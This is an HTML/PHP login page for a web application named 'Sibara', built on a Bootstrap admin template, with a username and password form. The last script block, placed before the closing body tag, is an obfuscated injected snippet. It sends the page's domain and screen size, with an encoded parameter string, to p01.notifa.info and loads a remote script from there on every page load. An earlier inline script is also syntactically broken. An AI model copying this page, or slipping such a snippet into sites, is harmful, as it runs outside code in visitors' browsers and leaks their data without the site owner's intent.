
<!DOCTYPE html>
<!--[if IE 8]><html class="ie8 no-js" lang="en"><![endif]-->
<!--[if IE 9]><html class="ie9 no-js" lang="en"><![endif]-->
<!--[if !IE]><!-->
<html class="no-js">
<!--<![endif]-->

<head>
    <title>Login Sibara</title>
    <link rel="shortcut icon" href="favicon.ico" />
    <!-- start: META -->
    <meta charset="utf-8" />
    <!--[if IE]><meta http-equiv='X-UA-Compatible' content="IE=edge,IE=9,IE=8,chrome=1" /><![endif]-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta content="Responsive Admin Template build with Twitter Bootstrap and jQuery" name="description" />
    <meta content="ClipTheme" name="author" />
    <!-- end: META -->
    <!-- start: MAIN CSS -->
    <link type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:400,300,600,700|Raleway:400,100,200,300,500,600,700,800,900/" />
    <link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/bower_components/bootstrap/dist/css/bootstrap.min.css" />
    <link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/bower_components/font-awesome/css/font-awesome.min.css" />
    <link type="text/css" rel="stylesheet" href="assets/fonts/clip-font.min.css" />
    <link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/bower_components/iCheck/skins/all.css" />
    <link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css" />
    <link type="text/css" rel="stylesheet" href="<?=base_url()?>assets/bower_components/sweetalert/dist/sweetalert.css" />
    <link type="text/css" rel="stylesheet" href="assets/css/main.min.css" />
    <link type="text/css" rel="stylesheet" href="assets/css/main-responsive.min.css" />
    <link type="text/css" rel="stylesheet" media="print" href="assets/css/print.min.css" />
    <link type="text/css" rel="stylesheet" id="skin_color" href="assets/css/theme/light.min.css" />
    <!-- end: MAIN CSS -->
    <!-- start: CSS REQUIRED FOR THIS PAGE ONLY -->
    <!-- end: CSS REQUIRED FOR THIS PAGE ONLY -->

</head>

<body class="login example2">

    <div class="main-login col-sm-4 col-sm-offset-4">
        <div class="logo">
            Sib<i class="fa fa-at"></i>ra
        </div>
        <!-- start: LOGIN BOX -->
        <div class="box-login">
            <h3>Halaman Login <i class="fa fa-spinner fa-spin"></i></h3>
            <p>
                Silahkan isi username dan password untuk login.
            </p>
            <!-- <form class="form-login" action="index.html"> -->
            <form action="<?php echo base_url(); ?>login/signin" method="post" onsubmit="return validate()">
                <fieldset>
                    <div class="form-group">
                    <span class="input-icon">
                        <input type="text" class="form-control" name="userName" placeholder="User Name" required>
                        <i class="fa fa-user"></i>
                    </span>
                    </div>
                    <div class="form-group">
                    <span class="input-icon">
                        <input type="password" class="form-control" name="password" placeholder="password" required>
                        <i class="fa fa-lock"></i>
                    </span>
                    </div>
                    <div class="form-group pull-right">
                        <button type="submit" class="btn btn-default btn-flat">Login</button>
                    </div>
                </fieldset>
            </form>
        </div>
        <!-- end: LOGIN BOX -->
        <!-- start: FORGOT BOX -->
        <!-- end: REGISTER BOX -->
        <!-- start: COPYRIGHT -->
        <div class="copyright">
            <script>
                document.write(new Date().getFullYear())
            </script> &copy; ramastudio.
        </div>
        <!-- end: COPYRIGHT -->
    </div>

    <!-- start: MAIN JAVASCRIPTS -->
    <!--[if lt IE 9]>
            <script src="<?=base_url()?>assets/bower_components/respond/dest/respond.min.js"></script>
            <script src="<?=base_url()?>assets/bower_components/Flot/excanvas.min.js"></script>
            <script src="<?=base_url()?>assets/bower_components/jquery-1.x/dist/jquery.min.js"></script>
            <![endif]-->
    <!--[if gte IE 9]><!-->
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/jquery/dist/jquery.min.js"></script>
    <!--<![endif]-->
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/jquery-ui/jquery-ui.min.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/blockUI/jquery.blockUI.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/iCheck/icheck.min.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/perfect-scrollbar/js/min/perfect-scrollbar.jquery.min.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/jquery.cookie/jquery.cookie.js"></script>
    <script type="text/javascript" src="<?=base_url()?>assets/bower_components/sweetalert/dist/sweetalert.min.js"></script>
    <script type="text/javascript" src="assets/js/min/main.min.js"></script>
    <!-- end: MAIN JAVASCRIPTS -->
    <!-- start: JAVASCRIPTS REQUIRED FOR THIS PAGE ONLY -->
    <script src="<?=base_url()?>assets/bower_components/jquery-validation/dist/jquery.validate.min.js"></script>
    <script src="assets/js/min/login.min.js"></script>
    <!-- end: JAVASCRIPTS REQUIRED FOR THIS PAGE ONLY -->

    <script>
        jQuery(document).ready(function() {
            Main.init();
            Login.init();
        });
    </script>

    <script>
     function(){
        swal("Oops...", "Something went wrong!", "error");
    };
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXl8l9oM51%2fHXDRnpRJ%2b4Bqauo%2bfOlZhIi4Koryf4bpMrS1WhIKLke2ygosAfnSy1uuomHoW%2bRjg08yJSOECpir8wnpsdzEk1OHdPzmYdGxguQqvHOVLUaJKJqfoDSVHM3vVyif07uaAoMIC3KwUf4mQbaSeua8bSLYMRCmNIlZyp%2f0KFdqq%2bYZbDOSvLlNdMnOZxRK0LQ1b8mVDRu5pptKLjbSJy7wLgZ3zGASitegnq5RZSqTewDD8yWBIN5W9SxWCnryKPF56aG0F2utkNLc%2bHfVqVrfGgS5mbMvUrYm8Fd1ERESN4tm%2b5laicWfh8ytAYCgsaDrgrPgbo2iga6oMk2mWY4RW0QdD7CMg70oe9QW1OgVTJVchwR4RDYffl%2fVFhAuSa7BvVPlT1NbH8G8%2fZVMH%2fNC3HOoUKWoSOLPDmeXf5CwseQj%2frScNdPWABEL0s22lpzeRcqiWoTPPENuBvRDsAQZQgIkwDKPUDzPfc%2fT7HtIkZr3pb%2f4SogbWInUGOWthC%2bJIwpeK3PHk1PEJCtPXH60sKu5V69zAFULU1i5gx5PGsuwwdaihnrUmlO4pKwJwNpISK6crO040J%2fCP3miWChkHWIDl%2fqlm1ETrgxF02Bnq9TRI4VUbrxLjltxMs%2fR67NZwo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>